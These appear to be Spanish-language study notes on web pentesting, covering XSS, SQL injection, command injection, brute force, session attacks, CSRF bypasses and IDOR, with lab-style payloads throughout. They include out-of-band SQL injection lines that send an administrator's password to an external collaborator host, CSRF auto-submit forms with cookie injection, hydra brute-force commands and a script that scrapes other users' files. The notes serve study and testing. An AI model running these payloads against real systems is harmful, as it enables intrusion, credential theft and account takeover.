### HTTP Verb Tampering:
- Insecure Configurations:
  - Limitar acceso a información por el tipo de Metodo, por ejemplo panel de autenticación podria limitar el acceso solo a PUT y GET, podria permitir al menos leer las cabeceras que regresen HEAD, o sí ejecuta una acción permite que se ejecute por detras.
```
<Limit GET POST>
    Require valid-user
</Limit>
```
- Insecure Coding:
  - Realizar sanitización especificando parametros solo de GET, pero despues recibir parametros sin importar el metodo, por ejemplo:
```
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) { #VALIDA QUE EL PARAMETRO DE GET VENGA LIMPIO )
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'"; #(EJECUTA EL PARAMETRO RECIBIDO SIN IMPORTAR SINO VIENE POR GET)
    ...SNIP...
}
```

## XSS:
- Tipos:
  - Reflejada: El cliente envia información, el servidor a la hora de procesarla regresa el HTML con JS inyectado.
  - Almacenada: El cliente envia información, el servidor almacena la info, y a la hora de procesarla nuevamente regresa el HTML con JS inyectado.
  - DOM: El cliente envia información, el servidor procesa y regresa la información, pero cliente procesa la información recibida mediante una función de javascript en el navegador, y el script de js inyecta codigo en el DOM.
    -> Ejemplo clasico: document.getElementById("output").innerHTML = location.hash;
    -> Inyecta lo que venga en el # en un objeto sin sanitizar, ejemplo: http://example.com/page.html#<script>alert(1)</script>
 
- Objetivos:
  - Robo de cookies
  - Browser exploitation
  - Keyloggin
  - Phishing: Fake forms
 
- Puntos basicos de inyección:
  - Atributos: onmouseover=alert()
  - href usando URI: href=javascript:alert()
  - Etiqueta HTML: <script>...
```
  <a id=parrafonormal onmouseover=alert() href=javascript:alert()>
  <script>alert...
```

### Ataques al DOM:
El DOM es la interfaz real de la pagina creada para HTML Y XML, es el esqueleto que es modificado por JS y HTML, entonces en este caso puede ser un XSS reflejado o almacenado pero que tiene como objetivo modificar el DOM por parte de un script en el cliente de JS.

IMPORTANTE: Se considera un XSS de tipo DOM cuando es enviado el request, se ejecuta en el servidor y regresa el html normal, y despues al ingresar la respuesta al navegador JS modifica el DOM del lado del cliente, y no proviene ya asi el HTML malicioso del servidor. 

¿En si que es el DOM?:
- DOM: (document)
  - Root element <html>
    - <Head>
      - <title>
    - <body>
      - element: <a> <h1>
        - attribute: "href"
        - attribute: "style"

- Scripts basicos para modificar el DOM:
  - Modificar contenido
```
    - document.querySelector("#name_t816bq").value = "ever<br>";
    - document.getElementById("demo").innerHTML = "I have changed!<br>"; NOTA: existe otra función llamada .getinnerText() solo inyecta texto ingorando html
```
  - Modificar un atributo
```
    - document.getElementById("myAnchor").href = "https://www.w3schools.com";
    - document.getElementById("myAnchor").contenteditable = "true";
    - document.write("Ejecución exitosa gracias: " + var_name) escritura general de cualquier cosa dentro del documento
```
  - Lectura de parametros:
```
    - URLSearchParams(window.location.search)).get('search'); busca el contenido del parametro search
    - decodeURIComponent(window.location.hash); regresa el valor de #valor de la url
    - // .slice(1)); busca y regresa el valor de # eliminando el primer caracter, un valor de 2 eliminaria primeros 2
```

#### Atacar eval()
  - Sí la variable es enviada a un eval, es muy suceptible a ser inyectada, dado que permite que eval es generico, ejecuta todo lo que se envie como variable, sin importar que sea.
```
    -> URL: https://doc.com/?stat=alert(document.cookie)
    - var stat = document.URL.split("stat=")[1];
    - eval(stat);
```
  - Va a ejecutar el alert, cuando posiblemente solo esperaba recibir una simple suma
     
#### Vulnerabilidades en jquery tipo DOM:

Muchas de las veces el problema es que justamente nos facilita la vida encapsulando funciones, que mandamos a llamar, pero sí las funciones jquery son inseguras o no dan por sentado que nosotros haremos sanitización, al enviar información jquery podria generar xss.

- CVE-2012-6708: Selector interpreted as HTML
   - Este codigo hara una busqueda para ver si hay H2 que contienen la palabra recibida en la URL /#seccion, el problema es que este tipo de funciones se les llama selectores (:contains) y lo que reciba en el selector va a ejecutarlo como html, dado que para realizar la busqueda va a crear un clon de la pagina en DOM inyectando incluido lo recibido en /#seccion, al ejecutar el DOM clonado tambien ejecutara lo recibido como tags de html.
     
```
$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
```
  - POC:
```
https://domain.com/#<img src=x onerror=alert()>
```

### Automatizado:
- xsser -url "https://domain.com/?pop=show" -p "target_host=XSS"
- xsser -url "https://domain.com/?pop=show" -p "target_host=XSS" --Fp "<script>alert("")</script> (ataque especifico)
- xsser --gtk (grafical interfaz)

## SQLInjection:
Los comandos de SQL en ocasiones son conctanados dentro del codigo de la aplicación web, la concatenación es literal copiar y pega el comando y mandarlo a ejecutar, entonces sí ademas copia dentro del comando valores no sanitizados, esto conlleva a que se ejecute lo que nosotros le digamos, elimiando el comando esperado.

### DBMS:
- Tipos de bases de datos:
  - Relacionales: Tienen conexiones entre las trablas llamadas llaves primarias y foraneas, que facilitan la conexión y relación entre la información que contienen.
| id\_usuario | nombre   | email                                       | edad |
| ----------- | -------- | ------------------------------------------- | ---- |
| 1           | Ana Ruiz | [ana@example.com](mailto:ana@example.com)   | 28   |
| 2           | Juan Gil | [juan@example.com](mailto:juan@example.com) | 34   |
  - No relacionales: Usada en información sin tanta estructura y relación entre datos, haciendolas más flexibles y rapidas, pero complejas en relacionamiento de datos.
```
{
  "_id": "u1",
  "nombre": "Ana Ruiz",
  "email": "ana@example.com",
  "edad": 28,
  "direccion": {
    "calle": "Av. Central 123",
    "ciudad": "Madrid",
    "postal": "28001"
  }
}
```
  - Orientado a objetos: No guarda la información en tablas y columnas, sino que directamente al objeto lo guardas en una BD sin descomponerlo en columnas.
```
//// Creación del objeto
public class Usuario {
    private String nombre;
    private String email;
    private int edad;

    public Usuario(String nombre, String email, int edad) {
        this.nombre = nombre;
        this.email = email;
        this.edad = edad;
    }

    // Getters y setters...
}

//// Almacenar el objeto
ObjectContainer db = Db4o.openFile("usuarios.db"); // Abre la base de datos
Usuario u = new Usuario("Ana", "ana@email.com"); //Setea los valores
db.store(u); // Guarda el objeto completo en disco
db.close(); // Cierra la base de datos
```

### Comandos clave SQL:
' or "                   Cierre y apertura de valores
/* sql... */             Comentarios multilinea
\+                       Concatenación
\# --                    Comentarios de una linea
||                       Concatenación
%                        Indicador de atributo
@variable                Variable local
@@variable               Variable global
waitfor delay '00:00:10' Sleep

### Evasión de waf o controles:
Existen varios metodos pero todo va a depender del contexto, algunos son por ejemplo:

#### Operaciones aritmeticas:
- Sí estamos usando un where en un integer, podemos agregarle un "+" para que haga operaciones aritmeticas:
```sql
    SELECT id from users where id=1+1
```
- Ademas existen otras operaciones en caso de que no este permitido el envio de +:
```sql
    WHERE id = 5*2
    WHERE id = POWER(2,3)  -- 8
    WHERE id = ASCII('A')  -- 65
    WHERE id = LENGTH('abc') -- 3
    WHERE id = (SELECT 1+1)
    WHERE id = CHAR(49)+CHAR(0)
```

#### Encoding:
- Ademas de realizar fuzzing siempre es bueno encodear los payloads con:
  - HTML Encoding
  - URL Encoding
  - BASE64 (dependera mucho del contexto de la app)
 
#### Envio de info dentro de XML:
- Entity: XML es muy versatil y permite trabajar con Entity, que principalmente se usa en XSS o XML injection, pero tambien puede ser usado para no inyectar directamentro dentro de la etiqueta:
```xml
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

- Encodear: El plugin Hackvector permite usar tags, que lo que coloques dentro el hara la conversión.
  - <@hex('hola')>asd</@hex> colocara un hola entre cada hexadecimal de cada caracter -> 61hola73hola64
  - <@hex_entities></@hex_entities>: Convierte caracteres a entidades hexadecimales HTML '<' → &#x3C;
  - <@hex_escapes>: Utiliza escapes hexadecimales 'A' → \x41
 
NOTA: El encodeamiento tambien se puede hacer de forma manual, no es necesario el plugin, pero a hacerlo más facil.

### Tipos de sqli:

#### In-Band:
- Error based: En base a provocar errores aparte de ser la forma más directa de conocer que existe un SQLI, se puede provocar errores por ejemplo de casteo, donde regresa el valor sí hubo un problema en su conversión de string a integer.

  - Posgres:

1- Provocar el error: Con un simple mal cierre del query, se puede producir el error
```sql
    '
```

2- Error basico: Este cast deberia provocar que regrese un string pero el espera un integer, entonces mostrara el valor a en pantalla, tambien puedes hacer lo mismo para provocar que se muestre la versión
```sql
    ' AND 1=CAST((SELECT 'a') AS int)--
    ' AND 1=CAST((SELECT version()) AS int)--
```

3- Información de columnas y tablas: Mismo paso donde puedes traer datos tipo integer y luego verlos como un error.
```sql
    ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- 
```

- Union based: Se une una segunda tabla al actual query, donde la segunda tabla sirve de pivote para saltar a más información.
  - ORACLE:

1- Detectar la cantidad de campos que tiene la tabla actual:
  - Opción 1: Incrementar el groupby hasta que se detecte en que numero se provoca un error.
```sql
      GROUP BY 1--
      GROUP BY 2--
```
  - Opción 2: Incrementar la cantidad de null hasta encontrar donde se provoca el error.
```sql
      ' UNION SELECT NULL FROM DUAL--
      ' UNION SELECT NULL,NULL FROM DUAL--
      ' UNION SELECT NULL,NULL,NULL FROM DUAL--
```
2- Conocer el tipo de valor de cada campo, colocando varios tipos hasta encontrar uno que sea string, dado que es el más facil de manipular:
```sql
      ' UNION SELECT 'A',NULL,NULL FROM DUAL--
      ' UNION SELECT NULL,'A',NULL FROM DUAL--
      ' UNION SELECT NULL,NULL,'A' FROM DUAL--
```
3- Comenzar a regresar información relevante como versiones, nombre de BD, incluso tablas:
```sql
    -- VERSION:
      SELECT banner,NULL,NULL FROM v$version
      SELECT version,NULL,NULL FROM v$instance
    -- NOMBRE DE LAS TABLAS:
      ' UNION SELECT owner,table_name,NULL FROM all_tables--
    -- NOMBRE DE LAS COLUMNAS:
      ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES'--
      ' UNION SELECT column_name,table_name FROM all_tab_columns--
```
#### Blind:
- Boleean based:
  - Basado en que provocar errores o ver sí existe diferencia en la respuesta del servidor a ejecutar querys con errores o valores especificos.

  - Postgres mensaje en pantalla:

1- Comportamiento: Detectar comportamientos basados en la respuesta como, por ejemplo sí el servidor regresa un "welcome" cuando el query regresa al menos una fila, o sí viene vacio no muestra el mensaje.
  -> Muestra el mensaje por regresar un campo:
```sql
  ' OR 1=1--
```
  -> No muestra el mensaje por no tener un campo valido:
```sql
  ' OR 2=1--
```

2- Validar en base a función sencilla conociendo el tamaño de variable:
```sql
  a' OR LENGTH(CURRENT_USER) = 5--
```

3- Calcular tamaño del campo:
```sql
  a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '____________________'--
```

4- Conocer el valor del campo:
```sql
    a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$'--
```

  - ORACLE Provocar errores
1- Provocar calculos invalidos como dividir entre 0:
  -> Payload 1: numeros 1 al tamaño del campo
  -> payload 2: caracteres y numeros
```sql
    a' OR (SELECT CASE WHEN (SUBSTR(password,$payload1$,1)='$payload2$') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') = 'a'-- 
```

- Time based:
  - Es en base a una función boleana, donde sí el tiempo de espera a la respuesta es mayor a la normal, significa que evalua la función como true y manda a hacer un sleep, o función que ralentiza su ejecución.
    - MYSQL:

1 - Posición: Dependiendo de en que posición de la ejecución, pero los payloads más sencillos para mysql v5 es:
```sql
      -- CAMPOS:
        Select $<SLEEP(5)> FROM users;
      -- WHERE:
        SELECT * FROM users WHERE username = '$<' OR SLEEP(5)--> -';
      -- ORDER BY:
        SELECT * FROM users ORDER BY $<IF(1=1, SLEEP(5), 1)>;
      -- HAVING:
        SELECT COUNT(\*) FROM users GROUP BY role HAVING COUNT(*) > 0 $<OR SLEEP(5)>;
      -- LIMIT:
        SELECT * FROM users LIMIT 1 $<OFFSET (SELECT SLEEP(5))>;
      -- IN:
        SELECT * FROM users WHERE id IN $<(SELECT id FROM users WHERE SLEEP(5))>;
      -- UPDATE:
        UPDATE users SET email = '$payload' WHERE id = 1; $payload= test@example.com', SLEEP(5), email='test2@example.com
      -- INSERT:
        INSERT INTO logs (message) VALUES ('$payload'); $payload= x'), (SLEEP(5)), ('y
```
2 - Validar: A partir de aquí primero debemos ejecutar una función donde validaremos que podemos hacer validaciones boleanas, con una función que en teoria casi siempre deberia funcionar, por ejemplo esta función va a hacer sleep sí encuentra que database contiene algun caracter:
```sql
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '%')#
```
3 - Contar caracteres: Podemos usar like '__' para ir incrementandolo hasta encontrar la cantidad de caracteres correcta:
```sql
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '__')# Sí falso = no esperar tiempo
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '___')# Sí verdadero = espera 1 segundo
```
4 - Adivinar caracteres: Usando "Intruder" y "Sniper Attack", incrustamos el mismo payload con caracteres o numeros, y en "Resouce Pool" solo ponemos un "request" como maximo y solo buscamos los que tarden más en responder

```sql
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '$_$$_$$_$')#
```

 - Postgres:

1- Validaciones basicas: La posición dependera mucho de donde va la inyección, no se puede ejecutar sleep directamente sin validaciones, el más basico por ejemplo puede ser:
```sql
      ' AND pg_sleep(5) IS NULL --
```

2- Condicionales: Ejecución de espera
  -> payload 1: numeros incrementales
  -> payload 2: caracteres y numeros
```sql
      a' OR (SELECT CASE WHEN (SUBSTRING(password,$payload1$,1)='$payload2$') THEN pg_sleep(5) ELSE 'a' END FROM users WHERE username='administrator') IS NULL--
```

#### Out of Band:
- HTTP/DNS responses:
Sí el request de sql es procesado en un segundo hilo, la respuesta no va a hacer una espera visible, por eso aun asi deberiamos poder enviar información hacia otros lados.

1- Posición: En este caso se debe cerrar el query, lo cual se puede hacer en varias opciones:
```sql
  ; (cerrar la consulta anterior)
  ' AND/OR (select ...) (concatenar un subquery)
  UNION (Unir un segundo select)
```
En cualquier caso debe seguir las reglas generales, por ejemplo una UNION debe llevar un ,NULL extra aparte del comando de dns en caso de que el query del codigo solo consulte una columna.

2- Seleccionar el payload en base a la versión, en este caso seria uno de ORACLE usando un UNION:
```sql
  x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://(subdomain).oastify.com/"> %remote;]>'),'/l') FROM dual--
```

2- Por generar segundo:
```sql
    '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

3- Exfiltrar, en este caso podemos concatenar variables o querys: 
```sql
    ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xrsy1oc2weq1cilvi2czyiwyipogc7avz.oastify.com/'||USER||'"> %remote;]>'),'/l') FROM dual--
    ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xrsy1oc2weq1cilvi2czyiwyipogc7avz.oastify.com/'||(SELECT password from users where username='administrator')||'"> %remote;]>'),'/l') FROM dual--
```

## Command Injection:
La ejecución de codigo puede ser desde diferente perspectiva, pero el objetivo es realizar una ejecución de codigo del lado del servidor abusando de funciones en el codigo, por ejemplo:

1. En PHP: system(), exec(), shell_exec(), passthru()
2. En Python: os.system(), subprocess.call(), etc.
3. En Node.js: child_process.exec()

El objetivo es lograr que ejecuta una segunda operación, aparte de la original

### Operadores comunes:
1. ```;```
   - Ejecuta varios comandos uno tras otro, sin importar si el primero falla. Ejemplo: ping 8.8.8.8 ; whoami
2. ```&&```
   - Ejecuta el segundo comando solo si el primero fue exitoso. Ejemplo: ping 127.0.0.1 && id
3. ```||```
   - Ejecuta el segundo comando solo si el primero falla. Ejemplo: ping 0.0.0.0 || echo fallo
4. ```&```
   - Ejecuta el primer comando en segundo plano. Ejemplo: sleep 10 &
5. ```|```
  - Usa la salida del primer comando como entrada del segundo (pipe). Ejemplo: cat /etc/passwd | grep root
6. ```>```
  - Redirige la salida a un archivo (sobrescribe). Ejemplo: ls > salida.txt
6. ```>>```
   - Redirige la salida y la agrega al final de un archivo. Ejemplo: echo hola >> log.txt
7. ```2>```
   - Redirige los errores a un archivo. Ejemplo: cat archivo.txt 2> errores.txt
8. ```2>/dev/null```
   - Silencia los errores (envía stderr al "basurero"). Ejemplo: cat archivo.txt 2>/dev/null
9. ```$(comando)```
   - Ejecuta el comando y lo reemplaza por su salida. Ejemplo: echo $(whoami)

## HTTP Authentication:
Proceso de autenticación simplificado otorgado por web servers, con el principal defecto de ser suceptibles a fuerza bruta.

1. Basic Auth:
   - hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.168.x.x http-get /basic-auth/
   - curl -u admin:cookie1 192.209.143.3/basic/

3. Digest Auth:
   - hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.168.x.x http-get /digest-auth/
   - curl --digest -u admin:adminpasswd 192.209.143.3/digest-auth/
  
## Login authentication:
Existen muchos tipos de ataques para sistemas de acceso, pero un listado puede ser:

1. Acceso por usuario y contraseña:
   - Texto plano: Sí van por texto plano es facil hacer un ataque de fuerza bruta o robarla sí viaja por canales inseguros.
   - Contraseña Cifrada: La contraseña podria ir cifrada, pero recordemos el cifrado ocurre del lado del cliente, entonces podemos leer el fichero de js encarado de hacer el cifrado o hashing, y replicar el proceso.

2. Acceso por OTP:
   - Sin limite: Sino hay limite de request en la validación, con un simple ataque de fuzzing podriamos acceder.
  
## Session Hijacking & Fixation:

1. Hijacking: Robo de la sesión de otro usuario, mediante el robo de tokens o identificadores de sesiones, permitiendo imitar al usuario real.
   - Session tampering: Sí el contenido del token o cookie no está cifrada y trae información modificable, por ejemplo, sí el valor es una cuenta admin o normal.
   - Session Prediction: Sí el identificador es facil de adivinar.
   - Session Sniffing: Interceptar el identificador sí viaja por canales inseguros.
   - XSS: Robo por ejecución de scripts de JS maliciosos en el navegador del usuario.

2. Fixation: Insertar un identificador a la victima, siendo un valor conocido por el atacante, para que al realizar la autenticación, ya conozca el ID a usar en la sesión, esto puede ocurrir en varias formas como:
   - El atacante envia una liga a la victima, con una URL que coloca un identificar de sesión al cliente.
   - Hacer que la victima haga click en un boton malicioso.
   - Provocar que la victima con ingeniera social que usa un metodo especifico para iniciar sesión.

   
## Exposición de datos sensibles:
Permitir la lectura de ficheros, provocar errores o leer los ficheros js, puede darnos mucha información:

1. Ficheros intencionales: Son aquellos que son necesarios para el funcionamiento normal de una aplicación, y deben estar expuestos pero a veces son demasiado especificos.
   - robots.txt: Fichero donde se pone directorios o ficheros que no se quiere que se indexe.
   - sitemap.xml: Fichero donde se pone directorios o ficheros que no quiere que se indexe.
   - crossdomain.xml: Usado por flash apps, pero puede permitir accesos indebidos.
   - security.txt: Fichero con información sobre el responsable de seguridad, pero puede contener más información.

2. Ficheros no intencionales: Son aquellos que las herramientas, servidor web, etc. crean por defecto, pero que tambien un usuario puede crear pensando que nadie lo encontrara.
   - Creados por servicios:
     - .git Carpeta usada por git para seguimiento del proyecto que contiene información sensible como el codigo.
     - .svn Carpeta usada por subversion (similar a git) para seguimiento del proyecto que contiene información sensible como el codigo.
     - .env	Ficheros del ambiente del sistema que pueden contener claves de acceso
     - server-status Pagina generada por apache "mod_status" para dar seguimiento al estatus del servidor
     - .DS_Store Carpeta creada por MAC que puede contener información del servidor
     - debug.log Ficheros de depuración y logs colocados dentro de la carpeta del web server
     - swagger.json, api-docs.json, openapi.json Ficheros con información sobre como funcionan las API
   - Subidos por el usuario:
     - backup.zip Respaldos creados en la misma carpeta del servidor
     - config.phg.old Respaldos individuales de ficheros
     - database.sql Ficheros de base de datos o configuraciones locales

3. Provocar errores: Dependera mucho del tipo de web server, pero el que es más facil es IIS.
   - Podemos encontrar información sensible como:
     - Versiones de la tecnologia.
     - Path donde está instalado
   - Metodos para provocar errores:
     - 404 Fichero no existente
     - Metodos HTTP no existentes
     - URL Mal formados, como admin%00.php

4- Ficheros: Ficheros comunes como JS, JSON, HTML, etc. Pueden contener información sensible pero al ser muy largos pueden pasarse por alto.
   - Buscar metodos ocultos, URL, tokens, comentarios, etc.

## CSRF:
Cross site request forgery, es cuando el servidor permite ejecutar funciones confiando en que provienen legitimamente del navegador del usuario.

1. Inyección de forms: A traves de un form malicioso se inyecta parametros ocultos y un action a la liga suceptible.
2. Ligas maliciosas: Ligas con parametros GET que al ejecutarse toma la sesión activa del usuario y realiza el ataque.
3. Ficheros HTML: Ficheros html que al abrirse en automatico ejecuten un script que redireccione con un form a la URL vulnerable.

### Medidas comunes:
Medidas comunes que usan las aplicaciones para evitar CSRF es:

#### CSRF:
1. El servidor inyecta un token random en cada formulario o en una cookie.
```html
<input type="hidden" name="csrf_token" value="4f92ef1c-f74e-4f8b-b0c3-a61cf8fadc31">
```
```
X-CSRF-Token
```
3. El cliente envia el token en cada request.
4. El servidor valida que ese token coincida con el de la sesión del usuario.
5. El servidor valida que el Referer o Origin coincida con dominios de confianza.

#### SameSite Cookies:
Cookies con la bandera samesite no permiten compartir información con otros sitios, aunque los navegadores modernos como chrome, ya implementan medidas ligeras para evitar el robo de cookies.

#### Referer-based validation:
Se valida que el "Origin" sea de una lista de dominios de confianza.

### Autoejecución del Form:
Es clave el metodo a usar para ejecutar en automatico acciones al ingresar y redireccionar al usuario con la información maliciosa, enumeraremos algunas:

1. Script de Javascript:
```html
<script>
  document.forms[0].submit();
</script>

<script>document.getElementById('EL').submit()</script>
```

2. Carga de evento:
```html
<body onload="document.forms[0].submit()">

<img scr="https..primerpayload" onerror="document.forms[0].submit()">
```

### Ejemplos de ataques:

#### Sin evasión:
1. Basico sin protección por POST:
```html
<body onload="document.forms[0].submit()">
<form action="https://academy.net/my-account/change-email" method="POST">
<input name="email" type="hidden" value="email=evaa@aa.com">
</form>
```

2. Basico sin protección por GET:
```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"></img>
```

### Tipos de evasiones de CSRF:
1. Metodo alterno sin validación del token:
   - Modificando el request original de POST a GET y validando sí por GET no pide el token y permite ejecutar la acción.
2. Eliminar el valor del input:
   - Algunas aplicaciones cuando no detectan que el request venga el parametro anticsrf lo dejan pasar como un request valido.
3. CSRF de otro usuario:
   - Algunas aplicaciones no validan sí el token solo es valido para un solo usuario, entonces sí usas otro que este vivo, podria aceptar el request.
   - NOTA: Usualmente los tokens necesitan estar vivos y no haber sido usados, por lo que habra que generar tokens nuevos con otro usuario.
4. CSRF Token no asociado a cookie de sesión:
   - Sí el token anticsrf no está asociado a una sesión como tal, podria ser suceptible a que nosotros inyectemos el valor de la cookie y usemos una cookie y token anticsrf vivo de otro usuario.
   - Para el proceso debemos encontrar una forma de inyectar una cookie, luego enviar el form con el token anticsrf:
```html
<img src="https://0a040003045e54fc80fe5da8009d00ae.web-security-academy.net/?search=select;%0d%0aSet-Cookie:%20csrfKey=fhwsPNTQe3UQ2IVYHKgVUThQUZ73TxYZ;+SameSite=None" onerror="document.forms[0].submit()"></img>

<form id="EL" action="https://0a040003045e54fc80fe5da8009d00ae.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="aqq@cacc.com">
  <input type="hidden" name="csrf" value="ZOjQ62csUcMyXo5bsBAbd7ARJQXvKqRC">
</form>
```
5. CSRFToken validado por estar tambien en una cookie:
   - Sí el servidor solo hace la validación del token CSRF en base a que el token sea al igual del request podria provocar que sí se tiene una función donde podamos inyectar cookies, podamos inyectar una cookie nuestra y duplicarla en el request, por ejemplo:
```
GET /...
Cookie: csrfkey=222

User=1&csrfkey=222
```
  - En base un payload similar a:
```html
<img src="https://a.web-security-academy.net/?search=select;%0d%0aSet-Cookie:%20csrf=I4R9vWYU4GCbDeWhAf1pEuoNx1Ou9jpm;+SameSite=None" onerror="document.forms[0].submit()"></img>

<form id="EL" action="https://a.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="aqq@cacc.com">
  <input type="hidden" name="csrf" value="I4R9vWYU4GCbDeWhAf1pEuoNx1Ou9jpm">
</form>
```
6. Evasión de politicas SameSite en cookies:
  - El procedimiento más sencillo es abusar de cookies con la politica colocada como Lax:
    - El request es aceptado por GET.
    - Se usan frameworks de desarrollo que sobre escriban el metodo por ejemplo "Symfony"
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
  - Tambien se podria abusar de strict, pero es más complicado:
    - Inyectar un form o liga en un subdominio vulnerable, y redireccionarlo al objetivo.

## IDOR:
Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.

- URL Parameters, JSON & APIs:
  - El más simple, userid=1000&credencial=ine.pdf, modificamos el userid y vemos otras credenciales.
- AJAX or JS Calls:
  - Funciones ocultas en javascript o ajax que no deberian poder ser llamadas, por ejemplo sí estamos en un panel normal donde hay un login para empleados, pero existe un parametro oculto llamado is_admin, que pasaria sí le dijieramos si somos admin en vez de no somos?
```
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
- Understand Hashing/Encoding
  - Bastante comun que las referencias son encodeadas o hasheadas como metodo de ocultar la información, pero que si conocemos la estructura y función usada podemos tambien modificar los datos.
  - ?filename=ZmlsZV8xMjQucGRm (BASE64) -> ?filename=file_124.pdf
  - Sino podemos saber que función se está usando podriamos tratar de verlo en JS Ajax.
```
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
- Compare User Roles:
  - Sí tenemos la posibilidad de crear varios usuarios podriamos ver diferencias de valores o variables en los parametros entre cada usuario, intentando usar el valor del segundo usuario creado, no todos los parametros son tan obvios que son la referencia a otro usuario.
```
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/d100/salaries/15ab"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
  - Por ejemplo sí notamos que el valor entre services y salaries es un valor variable que sí modificamos nos tre información de otro servicio de otro usuario.

- Herramientas: Lo más sencillo es usar intruder, pero en ciertas certs o sino tenemos la licencia se podria complicar, una forma manual seria:
  - curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
    - Buscamos patrones donde aparezca información relacionada a otros usuarios, pero para hacerlo automatizado podemos:
```
#!/bin/bash

url="http://SERVER_IP:PORT"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```














